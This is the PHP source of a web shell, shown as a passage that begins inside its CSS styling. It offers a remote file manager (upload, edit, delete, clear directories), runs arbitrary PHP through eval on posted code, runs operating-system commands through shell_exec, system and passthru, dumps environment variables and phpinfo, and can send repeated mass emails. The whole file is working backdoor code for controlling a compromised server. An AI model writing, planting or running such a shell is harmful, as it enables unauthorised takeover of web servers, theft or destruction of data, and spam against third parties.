font-weight: bold; 
border-left-width: 1px; 
font-size: 10px; 
border-left-color: #8B8989; 
background:#8B8989; 
border-bottom-width: 1px; 
border-bottom-color:#8B8989; 
color: black; 
border-top-color:#8B8989; 
font-family: trebuchet Ms; 
border-right-width: 1px; 
border-right-color: #8B8989;
}
input {
border-top-width: 1px; 
font-weight: bold; 
border-left-width: 1px; 
font-size: 10px; 
border-left-color: #8B8989; 
background: #8B8989; 
border-bottom-width: 1px; 
border-bottom-color: #8B8989; 
color: black; 
border-top-color:#8B8989; 
font-family: trebuchet Ms; 
border-right-width: 1px; 
border-right-color:#8B8989;
}
td {
    font-size: 10px; 
    font-family: verdana;
}
th {
    font-size: 10px; 
    font-family: verdana;
}
a:link {
    text-decoration: none;
}
a:visited {
    text-decoration: none;
        color:blue;
}
a:active {
    text-decoration: none;
}
a:hover {
    color: #00ff00; 
    text-decoration: none;
}
back {
background-color:grey;
}
 ul#Navigation {
position:absolute;
    width: 10em;
    margin: 0; padding: 0.8em;
    border: 1px solid #8B8989;
    background-color: #8B8989;
  }
  * html ul#Navigation {  /* Korrekturen fuer IE 5.x */
    width: 11.6em;
    w\idth: 10em;
    padding-left: 0;
    padd\ing-left: 0.8em;
  }
  ul#Navigation li {
    list-style: none;
    margin: 0.4em; padding: 0;
  }

  ul#Navigation a {
    display:block;
    padding: 0.2em;
    text-decoration: none; font-weight: bold;
    border: 1px solid black;
    border-left-color: black; border-top-color: black;
    color: black; background-color: #8B8989;
  }
  * html ul#Navigation a {  /* Breitenangaben nur fuer IE */
    width: 100%;
    w\idth: 8.8em;
  }
  ul#Navigation a:hover {
    border-color: white;
    border-left-color: black; border-top-color: black;
    color: white; background-color: #8B8989;
  }
</style>

<?php
if (!function_exists(rename_all)) {
    function rename_all($dir,$prefix,$name,$del) {
     $r_dir=opendir($dir);
       while (false !== ($file_r = readdir($r_dir))) {
         if (@filetype($dir."/".$file_r)=="file") {
           $i++;
        @copy($dir."/".$file_r,$dir."/".$i.".".$prefix.$name) or die ("[-]Error renaming file : ".$file_r."");
         if ($del=="yes") {
          @unlink($dir."/".$file_r) or die ("[-]Error deleting file(s)!");
        }
       }
       
      }
       echo "Successfully renamed file(s)!";
    }
  }
        
        

if (!function_exists(get_perms)) {
     function get_perms($file) {
    if (@file_exists($file)) {
      if (@is_readable($file)) {
        echo "<b>R</b>";
         }
           if (@is_executable($file)) {
            echo "<b>E</b>";
             }
               if (@is_writable($file)) {
                echo "<b>W</b>";
                }
              } else {
                 echo "[-]Error";
               }
            }
          }

if (!function_exists(search_file)) {
   function search_file($search,$dir) {
    global $word;
     global $surl;
    $d_s=opendir($dir);
    while (false !== ($file_s = readdir($d_s))) {
      if (preg_match("/".$search."/i",$file_s))   {
         echo "<a href=".$surl."?&".$word."&file_browser&file=".urlencode($dir)."/".urlencode($file_s).">".$file_s."</a><br>";
         }
       }
     }
   }


if (!function_exists(copy_file)) {
    function copy_file($file,$to) {
   if (@file_exists($file)) {
     @copy($file,$to) or die ("[-]Error copying file!");
      echo "Successfully copied file!";
       } else {
           echo "[-]File Doesnt exist!";
       }
    }
 }

if (!function_exists(send_mail)) {
   function send_mail($from,$to,$text,$subject,$times) {
              while ($i<$times) {
               $i++;
               $header  = "From: $from\r\n";    
                @mail($to, $subject, $text, $header) or die ("[-]Error sending mail(s)!");

              }
                   echo "Successfully sent mail(s) to ".$to."!";
   }
 }


if (!function_exists(read_file)) {
   function read_file($file) {
$file=@fopen($file,"r");
echo fread($file,10000);
fclose($file);
       }
     }

if (!function_exists(write_file)) {
   function write_file($file,$text) {
     if (@is_writable($file)) {
      if (@file_exists($file)) {
        $file_w=@fopen(urldecode($file),"w") or die ("[-]Error");
         if (fwrite($file_w,$text)) {
            echo "Successfully written to file(s)!";
          }
        }
     }
           else {
           echo "[-]Error";
            exit;
     }
   }
 }
      


if (!function_exists(count_all)) {
     function count_all($dir) {
       $c_d=opendir($dir);
        while (false !== ($file_c = readdir($c_d))) {
         if (@filetype($dir."/".$file_c)=="file") {
            $file_c_s++;
         } 
           else 
         { 
            $dir_c++;
         }
        }
       echo "Directories:";
        echo $dir_c++;
         echo "||";
          echo "Files:";
            echo $file_c_s;
     }
}

if (!function_exists(check_access)) {
   function check_access($file) {
     if (@is_readable($file)) {
       echo "R";
        }
         if (@is_executable($file)) {
           echo "E";
             } 
              if (@is_writable($file)) {
                echo "W"; 
                 }
              } 
           }

if (!function_exists(clear_dir)) {
   function clear_dir($dir) {
$o_d=opendir($dir);
   while (false !== ($file = readdir($o_d))) {
    if (@filetype(urldecode($_GET['file'])."/".$file)=="file") {
unlink(urldecode($dir)."/".$file) or die ("[-]Error @ file:".$file."");
   }
 }
echo "Successfully cleared directory!";
   }
 }

?>


<?php
// real code start !


if (isset($_GET['update'])) {
echo "<center><table border=\"1\" rules=\"groups\">
  <thead>
    <tr><td>";
check_update();
exit;
}
if (isset($_GET['rmdir']))  {
echo "<center><table border=\"1\" rules=\"groups\">

  <thead>
    <tr><td>";
@rmdir($_GET['file']) or die ("[-]Error deleting dir!");
echo "Successfully deleted dir(s)!";
exit;
}


if (isset($_GET['upload'])) {
$uploaddir = urldecode($_POST['file']);

print "<pre>";
if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir ."/". $_FILES['userfile']['name'])) {
echo "<center><table border=\"1\" rules=\"groups\">
  <thead>
    <tr><td>";
   print "Successfully uploadet file(s)!";
} else {
echo "<center><table border=\"1\" rules=\"groups\">
  <thead>
    <tr><td>";
   print "[-]Error";
}
exit;
}

if (isset($_GET['search'])) {
echo "<center><table border=\"1\" rules=\"groups\">
  <thead>

    <tr><td>";
search_file($_POST['search'],urldecode($_POST['dir']));
exit;
}




if (isset($_GET['getenv'])) {
echo "<center><table border=\"1\" width=600 rules=\"groups\">
  <thead><br>
    <tr><td>";
echo getenv($_GET['getenv']);
exit;
}


if (isset($_GET['php_info'])) {
echo "<center><table border=\"1\" width=600 rules=\"groups\">
  <thead><br>
    <tr><td>";
phpinfo();
exit;
}

if (isset($_GET['defined_vars'])) {
echo "<center><table border=\"1\" width=600 rules=\"groups\">
  <thead><br>
    <tr><td>";
echo "<center><textarea rows=40 cols=120>";
$vars=get_defined_vars();
print_r($vars);
echo "</textarea>";

exit;
}

if (isset($_GET['env'])) {
echo "<center><table border=\"1\" width=600 rules=\"groups\">

  <thead><br>
    <tr><td>";
$ary=get_defined_vars();
$it=array_keys($ary);
foreach ($it as $i) {
echo "<a href=".$surl."?&".$word."&getenv=".$i.">".$i."</a><br>";

}
exit;
}

if (isset($_GET['play'])) {
echo "<embed src=".urlencode($filename)." autostart=true loop=true hidden=true height=0 width=0>";
exit;
}


if (isset($_GET['special_crypt'])) {
echo "<center><table border=\"1\" width=600 rules=\"groups\">
  <thead><br>
    <tr><td>";
echo "<textarea rows=15 cols=90>";
if (isset($_POST['submit'])) {
$file=@fopen($_FILES['userfile']['tmp_name'],"r") or die ("[-]Error reading file!");
$meth=$_POST['crypt'];
if ($meth=="1") {
echo htmlspecialchars(md5(fread($file,10000)));
 } elseif ($meth=="2") {
      echo htmlspecialchars(crypt(fread($file,10000)));
}
    elseif ($meth=="3") {
     echo htmlspecialchars(sha1(fread($file,10000)));
  }
elseif ($meth=="4") {
     echo htmlspecialchars(crc32(fread($file,10000)));
}
   elseif ($meth=="5") {
     echo htmlspecialchars(urlencode(fread($file,10000)));
}

   elseif ($meth=="6") {
     echo htmlspecialchars(urldecode(fread($file,10000)));
}
   elseif ($meth=="7") {
     echo htmlspecialchars(base64_encode(fread($file,10000)));
}

elseif ($meth=="8") {
     echo htmlspecialchars(base64_decode(fread($file,10000)));
}

}
echo "</textarea><div align=left>";

?>
<form enctype="multipart/form-data" action=<?php echo $surl ?>&<?php echo $word ?>&special_crypt method="post">
file: <input name="userfile" type="file"><br><br>

<input type="submit" value="Start" name="submit"><br>
<input type=radio name=crypt value=1>md5();<br>
<input type=radio name=crypt value=2>crypt();<br>
<input type=radio name=crypt value=3>sha1();<br>
<input type=radio name=crypt value=4>crc32();<br>
<input type=radio name=crypt value=5>urlencode();<br>
<input type=radio name=crypt value=6>urldecode();<br>
<input type=radio name=crypt value=7>base64_encode();<br>
<input type=radio name=crypt value=5>base64_decode();<br>

<?php
exit;
}
if (isset($_GET['crypt'])) {
echo "<center><table border=\"1\" width=600 rules=\"groups\">
  <thead><br>
    <tr><td>";
?>
<form action=<?php echo $surl ?>?&<?php echo $word ?>&crypt method="post">
Crypt:<br>
<textarea rows=12 cols=120 name=crypt>
</textarea>
<?php
$text=$_POST['crypt'];
?>
md5:&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;<input size=40 type=text value=<?php echo htmlspecialchars(md5($text)) ?>><br><br>

crypt:&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;<input size=40 type=text value=<?php echo htmlspecialchars(crypt($text)) ?>><br><br>

sha1:&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;<input size=40 type=text value=<?php echo htmlspecialchars(sha1($text)) ?>><br><br>

crc32:&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;<input size=40 type=text value=<?php echo htmlspecialchars(crc32($text)) ?>><br><br>

urlencode:&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;<input size=40 type=text value=<?php echo  htmlspecialchars(urlencode($text)) ?>><br><br>

urldecode:&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;<input size=40 type=text value=<?php echo htmlspecialchars(urldecode($text)) ?>><br><br>

base64_encode:&ensp;<input type=text size=40 value=<?php echo base64_encode($text) ?>><br><br>

base64_decode:&ensp;<input type=text size=40 value=<?php echo base64_decode($text) ?>><br><br>
<?php
echo "<input type=submit value=Start></form><form action=".$surl."?&".$word."&special_crypt method=post><input type=submit value=file_inload_crypt>";
exit;
}

if (isset($_GET['php_code'])) {
echo "<center><table border=\"1\" width=600 rules=\"groups\">
  <thead><br>
    <tr><td>";
?>
<form action=<?php echo $surl ?>&<?php echo $word ?>&php_code method="post">

<textarea rows=12 cols=120 name=code>
</textarea>
<textarea rows=12 cols=120 readonly>
<?php
eval($_POST['code']);
echo "</textarea>";
echo "<br><br><input type=submit value=Start>";
exit;
}

if (isset($_GET['search_st'])) {
   if (isset($_POST['search'])) {
search_file($_POST['search'],$_POST['dir']);
 }
exit;
}


if (isset($_GET['rename_all'])) {
echo "<center><table border=\"1\" width=600 rules=\"groups\">
  <thead><br>
    <tr><td>";
rename_all(urldecode($_POST['d']),$_POST['prefix'],$_POST['name'],$_POST['del']);
exit;
}

if (isset($_GET['special_d'])) {
echo "<center><table border=\"1\" width=600 rules=\"groups\">
  <thead><br>
    <tr><td>";
 $way=$_POST['way'];
   if ($way=="1") {
clear_dir($_GET['file']);
   exit;
  }
    if ($way=="2") {
echo "<center><table border=\"1\" width=600 rules=\"groups\">
  <thead><br>

    <tr><td>";
?>
<form action=<?php echo $surl ?>?&<?php echo $word ?>&rename_all method="post">
Prefix:<br><input type="text" name="prefix"><br>
Name:<br><input type="text" name="name"><br>
<input type="hidden" name="d" value=<?php echo urlencode($filename) ?>>
Delete old files?:<input type="radio" name="del" value="yes"><br>
<br><input type="submit" value="Rename">
<?php
exit;
}
}


if (isset($_GET['special_dir'])) {
echo "<center><table border=\"1\" width=600 rules=\"groups\">
  <thead><br>
    <tr><td>";
?>

<form action=<?php echo $surl ?>?&<?php echo $word ?>&special_d&file=<?php echo urlencode($filename) ?> method=post>
<input type="radio" name="way" value="1">Clear Dir<input type=hidden name=dir value=<?php echo urlencode($filename) ?>><br><br>
<input type="radio" name="way" value="2">Rename with prefix<br><br>
<input type="submit" name="sub" value="Start">
<?php
exit;
}

if (isset($_GET['delete'])) {
   if (@file_exists($filename)) {
echo "<center><table border=\"1\" width=600 rules=\"groups\">
  <thead>
    <tr><td>";
    @unlink($filename) or die ("[-]Error deleting file!");
     echo "Successfully Deleted File!";
      exit;
   }
}

if (isset($_GET['save'])) {
echo "<center><table border=\"1\" width=600 rules=\"groups\">

  <thead>
    <tr><td>";
     write_file(urldecode($_POST['file']),stripslashes($_POST['text']));
   
   exit;
}

if (isset($_GET['exec'])) {
echo "<center><table border=\"1\" width=600 rules=\"groups\">
  <thead>
    <tr><td><center>";
@chdir(urldecode($_POST['dir']));
echo "<textarea rows=15 cols=114>";
echo shell_exec($_POST['command']);
echo "</textarea>";
exit;
}


if (isset($_GET['mkdir'])) {
   if (isset($_POST['name'])) {
echo "<center><table border=\"1\" rules=\"groups\">
  <thead>
    <tr><td>";
     mkdir(urldecode($_POST['dir'])."/".$_POST['name']) or die ("[-]Error creating dir!");
     echo "Successfully created dir!";
   }
exit;
}

if (isset($_GET['mkfile'])) {
   if (isset($_POST['name'])) {
echo "<center><table border=\"1\" rules=\"groups\">

  <thead>
    <tr><td>";
$dir=urldecode($_POST['dir']);
$filed=$_POST['name'];

       if (@file_exists($dir."/".$filed)) {
     echo "[-]Allready exists!";
      exit;
     }
    $file_c=@fopen($dir."/".$filed,"w") or die ("[-]Can't create file!");
     echo "Scuessfully created file(s)!";
   }
exit;
}

if (isset($_GET['edit'])) {
echo "<center><table border=\"1\" width=600 rules=\"groups\">
  <thead>
    <tr><td>";
   if (@file_exists($filename)) {
     echo "<form action=".$surl."?&".$word."&save method=post><textarea rows=15 cols=90 name=text>";
      read_file($filename);
       echo "</textarea><br><br><input type=hidden name=file value=".urlencode($_GET['file'])."><input type=submit name=sub value=Save>";
       }
    exit;
}



if (isset($_GET['copy_start'])) {
echo "<center><table border=\"1\" width=600 rules=\"groups\">
  <thead>
    <tr><td>";
copy_file($_POST['from'],$_POST['to']);
exit;
}



if (isset($_GET['copy_file']))  {
echo "<center><table border=\"1\" width=600 rules=\"groups\">

  <thead>
    <tr><td>";
?>
<form action=<?php echo $surl ?>?&<?php echo $word ?>&copy_start method="post">
New:<br><textarea rows=4 cols=70 name="to"><?php echo realpath($filename) ?></textarea><br><br>
Old:<br><textarea rows=4 cols=70 name="from"><?php echo realpath($filename) ?></textarea><br><br>
<input type="submit" name="sub" value="Copy">
<?php
exit;
}

if (isset($_GET['send_mail_st'])) {
echo "<center><table border=\"1\" width=600 rules=\"groups\">
  <thead>

    <tr><td>";
if (isset($_POST['from'])) 
{
if (isset($_POST['to'])) 
{
if (isset($_POST['text'])) 
{
if (isset($_POST['subject']))
{
if (isset($_POST['times']))
{
send_mail($_POST['from'],$_POST['to'],$_POST['text'],$_POST['subject'],$_POST['times'])  ; 
exit;
}
}
}
}
}
}
if (isset($_GET['send_mail'])) {
echo "<center><table border=\"1\" width=600 rules=\"groups\">
  <thead>
    <tr><td>";
?>
<form action=<?php echo $surl ?>?&<?php echo $word ?>&send_mail_st method="post">
From:&ensp;&ensp;&ensp;&ensp;<input type="text" name="from"><br><br>
To:&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;<input type="text" name="to"><br><br>
Subject:&ensp;&ensp;<input type="text" name="subject"><br><br>
Times:&ensp;&ensp;&ensp;<input type="text" name="times"><br><br>

Text:<br><textarea rows=15 cols=60 name="text"></textarea><br><br>
<input type="submit" name="sub" value="Send!">
<?php
exit;
}
if (isset($_GET['file_browser'])) {

   for ($i=0;$i<4;$i++) {
     if (preg_match("/".$file_tps["img"][$i]."/i",$extn)) {
echo "<center><table border=\"1\" rules=\"groups\">
  <thead>
    <tr><td>";
     echo "<a href=".$surl."?&".$word."&file_browser&file=".urlencode($filename)."&img><img src='".urldecode($surl)."?&".$word."&file=".urldecode($filename)."&img' height= width= border=0><br>";
  exit;
}  }



if (@filetype($j_f)=="file") {
echo "<center><table border=\"1\" rules=\"groups\" 
  <thead>
    <tr><td>";
highlight_file($j_f);

exit;
}
echo "<center><table border=\"1\" rules=\"groups\">
  <thead>
    <tr>

      <th></th><td>";
count_all($j_d);
echo "</tr>";
echo "<center><table border=\"1\" rules=\"groups\">
  <thead>
    <tr>
      <th>Filename</th><th>Edit</th><th>Copy</th><th>Download</th><th>Delete<th>Perms</th><th>Access</th> ";




$o_d=opendir($j_d);



   while (false !== ($file = readdir($o_d))) {
     echo " <tbody>

    <tr>
      <td>";
if (@filetype($j_d."/".$file)=="dir") {
echo "</a><img  src=".$surl."?&".$word."&dir&pic=dir height=12 width=><a href=".$surl."&".$word."&&file_browser&file=".urlencode($j_d)."/".urlencode($file).">[".$file."]";
} else {
echo "<img  src=".$surl."?&".$word."&dir&pic=ext_wri height=9 width=><a href=".$surl."&".$word."&&file_browser&file=".urlencode($j_d)."/".urlencode($file).">";
echo $file;
}
echo "<br></a></td><td><a href=".$surl."&".$word."&edit&file_browser&file=".urlencode($j_d)."/".urlencode($file).">";
if (@filetype($j_d."/".$file)=="file") {
echo "<center>[Edit]";
}
else {
echo "</a><center>[-]";
}
echo "</a></td><td><a href=".$surl."&".$word."&copy_file&file_browser&file=".urlencode($j_d)."/".urlencode($file).">";
if (@filetype($j_d."/".$file)=="file") {
echo "<center>[Copy]";
} else {
echo "</a><center>[-]";
}
echo "</a></td><td><a href=".$surl."&".$word."&download&file_browser&file=".urlencode($j_d)."/".urlencode($file).">";
if (@filetype($j_d."/".$file)=="file") {
echo "<center>[Download]";
} else {
echo "</a><center>[-]";
}
echo "</a></td><td><a href=".$surl."&".$word."&delete&file_browser&file=".urlencode($j_d)."/".urlencode($file).">";
if (@filetype($j_d."/".$file)=="file") {
echo "<center>[Delete]";
} else {
echo "</a><center><a href=".$surl."&".$word."&rmdir&file_browser&file=".urlencode($j_d)."/".urlencode($file).">[Delete]</a>";
} 
echo "<td><center>";
echo @fileowner($j_f."/".$file);
echo "</td>";
echo "<td><center>";
get_perms(fileperms($j_f."/".$file));
echo "</td>";
echo "</a></td>";
 }
echo "<center><table width=360 height=40 border=\"1\" rules=\"groups\">

  <thead>
    <tr>
      <th></th><td>";
?>
<form enctype="multipart/form-data" action=<?php echo $surl ?>&<?php echo $word ?>&upload method="post">
file: &ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;<input name="userfile" type="file">
<input type="hidden" name="file" value=<?php echo urlencode($_GET['file']) ?>>
<input type="submit" value="Upload"><br><br><?php
if (@is_writable($j_d)) {
echo "<font color=green>[Ok]</font>";
  } else {
echo "<font color=red>[No]</font>";
 }
?>
</form>

<?php
echo "</td><center><table width=360 height=40 border=\"1\" rules=\"groups\">
  <thead>
    <tr>
      <th></th><td>";
?>
<form action=<?php echo $surl ?>&<?php echo $word ?>&search method="post">
search: &ensp;&ensp;&ensp;&ensp;<input name="search" type="text">
<input type="hidden" name="dir" value=<?php echo urlencode($_GET['file']) ?>>
&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;<input type="submit" value="Search">
</form>
<?php

echo "</td><center><table width=360 height=40 border=\"1\" rules=\"groups\">
  <thead>

    <tr>
      <th></th><td>";
?>
<form action=<?php echo $surl ?>?&<?php echo $word ?>&mkdir method="post">
name: &ensp;&ensp;&ensp;&ensp;&ensp;<input name="name" type="text">
<input type="hidden" name="dir" value=<?php echo urlencode($_GET['file']) ?>>
&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;<input type="submit" value="mkdir">
</form>
<?php
if (@is_writable($j_d)) {
echo "<font color=green>[Ok]</font>";
  } else {
echo "<font color=red>[No]</font>";
 }
echo "</td><center><table width=360 height=40 border=\"1\" rules=\"groups\">

  <thead>
    <tr>
      <th></th><td>";
?>
<form action=<?php echo $surl ?>&<?php echo $word ?>&mkfile method="post">
name:&ensp;&ensp;&ensp;&ensp;&ensp; <input name="name" type="text">
<input type="hidden" name="dir" value=<?php echo urlencode($_GET['file']) ?>>
&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;<input type="submit" value="mkfile">
</form>
<?php
if (@is_writable($j_d)) {
echo "<font color=green>[Ok]</font>";
  } else {
echo "<font color=red>[No]</font>";
 }
echo "</td><center><table width=360 height=40 border=\"1\" rules=\"groups\">

  <thead>
    <tr>
      <th></th><td>";
?>
<form action=<?php echo $surl ?>&<?php echo $word ?>&exec method="post">
command: <input name="command" type="text">
<input type="hidden" name="dir" value=<?php echo urlencode($_GET['file']) ?>>
&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;<input type="submit" value="execute">
</form>
<?php
echo "</td><center><table border=\"1\" rules=\"groups\">
  <thead>
    <tr>

      <th></th><td><a href=".$surl."?&".$word."&special_dir&file=".urlencode($filename).">Special DirOptions</a></td> ";
echo "</a>";
exit;
  }
?>



<html>
  <ul id="Navigation">
    <li><a href=<?php echo $surl ?>&<?php echo $word ?>&file_browser&file=<?php echo  "." ?>>File_Browser</a></li>
    <li><a href=<?php echo $surl ?>&<?php echo $word ?>&send_mail>Send Mail(s)</a></li>

    <li><a href=<?php echo $surl ?>&<?php echo $word ?>&php_code>php_code</a></li>
    <li><a href=<?php echo $surl ?>&<?php echo $word ?>&crypt>crypter</a></li>
    <li><a href=<?php echo $surl ?>&<?php echo $word ?>&php_info>php_info()</a></li>
    <li><a href=<?php echo $surl ?>&<?php echo $word ?>&defined_vars>defined_vars()</a></li>
    <li><a href=<?php echo $surl ?>&<?php echo $word ?>&env>env()</a></li>

    <li><a href=<?php echo $surl ?>&<?php echo $word ?>&update>update()</a></li>
  </ul>
<center><table border="1" rules="groups">
  <thead>
    <tr>
     <th></th>
       <td>
<form action=<?php echo $surl ?>?&<?php echo $word ?>&exec_st method="post">

<input type="submit" name="sub" value="Execute"><br>
<br>
<input type="text" name="command">
<br>
<input type="radio" name="method" value="1">shell_exec();
<input type="radio" name="method" value="2">system();
<input type="radio" name="method" value="3">passthru();
<input type="radio" name="method" value="4">automatic();<br>
<textarea name="exec" rows=15 cols=90>
<?php
if (isset($_GET['exec_st'])) {
    $meth=$_POST['method'];
      $com=$_POST['command'];
        if (isset($meth)) {
          if ($meth=="1") {
            echo shell_exec($com);
              }
               elseif($meth=="2") {
                 echo system($com); 
                   }
                  elseif ($meth=="3") {
                    passthru($com);
                     }
                       elseif ($meth=="4") {
                         if (function_exists(shell_exec)) {
                            echo shell_exec($com);
                              }
                                 elseif (function_exists(system)) {
                                   echo system($com);
                                     }
                                       elseif (function_exists(passthru)) {
                                         echo passthru($com);
                                           }
                                             else {
                                              echo "[-]Error";
                                             }    
                                          }
                                       }
                                    }
echo "</textarea>";
exit;
?> 